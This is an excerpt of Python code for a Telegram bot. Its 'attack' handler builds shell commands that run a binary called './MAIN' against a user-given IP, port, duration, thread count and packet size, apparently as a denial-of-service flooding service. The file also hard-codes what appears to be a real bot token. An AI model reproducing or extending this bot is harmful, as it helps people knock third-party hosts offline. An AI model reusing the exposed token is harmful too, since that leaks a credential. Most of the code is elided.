...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7837130437:AAHnHtp_pRmWXGTll-UKI-3BT1_SQaKS76E'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./MAIN {ip} {port} {duration} 10"
    elif argument_type == 4:
        attack_command = f"./MAIN {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./MAIN {ip} {port} {duration} {byte_size} {threads}"
